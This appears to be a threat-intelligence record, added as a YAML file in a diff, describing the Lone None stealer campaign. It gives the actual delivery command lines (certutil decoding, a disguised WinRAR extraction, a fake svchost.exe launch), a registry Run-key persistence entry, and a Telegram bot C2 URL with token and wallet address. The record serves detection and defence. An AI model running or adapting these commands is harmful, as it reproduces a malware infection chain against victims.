@@ -1,0 +1,50 @@
+description: Lone None threat actor delivers a Python installer that decodes and extracts
+  malicious payloads using certutil.exe and WinRAR, then runs a staged Python script
+  (svchost.exe) with Telegram bot C2 for persistence via HKCU registry key.
+attribution: Lone None
+malware_families:
+- Pure Logs Stealer
+- Lone None Stealer
+TTPs:
+  processes:
+  - svchost.exe
+  - certutil.exe
+  - images.png
+  - Document.pdf
+  commandline:
+  - cmd /c cd _ && start Document.pdf && certutil -decode Document.pdf Invoice.pdf
+    && images.png x -ibck -y Invoice.pdf C:\Users\Public
+  - cd C:\Users\Public\Windows && start C:\Users\Public\Windows\svchost.exe
+    C:\Users\Public\Windows\Lib\images.png MRB_NEW_VER_BOT && exit
+  powershell: []
+  scripting_engine: []
+  registry_keys:
+  - HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
+  image_load: []
+  network_connections:
+  - process: svchost.exe
+    destination: 'hxxps://api.telegram.org/bot7414494371:AAFbG9iefAZBntqLN0drlccfKAlGlq7KPo/sendMessage?chat_id=1916486798&text=<b>
+      Computer Name:</b> <code>REDACTED</code> Detected <b>BTC</b> address: <code>REDACTED</code>
+      Replaced with: <code>1DPguuHEophw6rvPZZkjBA3d8Z9ntCqm1L</code>'
+  file_activity:
+  - C:\\Users\\Public\\Windows\\svchost.exe
+  - C:\\Users\\Public\\Windows\\Lib\\images.png
+  - C:\\Users\\Public\\Invoice.pdf
+  persistence:
+  - Registry Run key HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run for svchost.exe
+  process_relations: []
+IOCs:
+  urls:
+  - 'hxxps://api.telegram.org/bot7414494371:AAFbG9iefAZBntqLN0drlccfKAlGlq7KPo/sendMessage?chat_id=1916486798&text=<b>
+    Computer Name:</b> <code>REDACTED</code> Detected <b>BTC</b> address: <code>REDACTED</code>
+    Replaced with: <code>1DPguuHEophw6rvPZZkjBA3d8Z9ntCqm1L</code>'
+  hashes: []
+  ips: []
+  domains:
+  - tr.lee
+  - goo.su
+authors:
+- Kahng An
+reference: https://cofense.com/blog/inside-vietnamese-threat-actor-lone-none-s-copyright-takedown-spoofing-campaign
+date_of_publication: September 24, 2025
+file_creation_date: September 27, 2025
